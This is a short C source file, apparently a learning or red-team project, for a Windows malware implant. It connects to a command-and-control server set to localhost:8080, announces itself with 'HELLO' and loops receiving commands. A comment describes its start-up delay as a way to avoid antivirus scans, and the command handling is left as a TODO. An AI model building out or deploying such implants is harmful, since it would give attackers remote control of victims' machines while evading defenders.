#include "c2_net.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>

// Configurations
#define SLEEP 1
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080


// cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
// cl implant.c c2_net.c /Fe:implant.exe
int main() {

    // Sleep on start to avoid AV scans
    Sleep(SLEEP * 1000);

    // Basic setup
    if (!setup_comms()) {
        return 1;
    }

    // Connect to C2 server
    SOCKET c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
    if (c2_sock == INVALID_SOCKET) {
        closesocket(c2_sock);
        WSACleanup();
        return 1;
    }

    // Send hello to C2 server to let them know the implant is up and running
    c2_send(c2_sock, "HELLO", 5);

    char buffer[512];
    int len = 0;
    while (TRUE) {
        // Get data
        len = c2_recv(c2_sock, buffer, 511);
        if (len == SOCKET_ERROR) {
            continue;
        }
      

        // Process data
        buffer[len] = '\0';
        c2_log("%s\n", buffer);


        // TODO: big switch statement that has calls out to implant functionality
        if (strncmp(buffer, "QUIT", 4) == 0) {
            break;
        }

        

    }

    // Close the socket
    closesocket(c2_sock);
    WSACleanup();
    return 0;
}
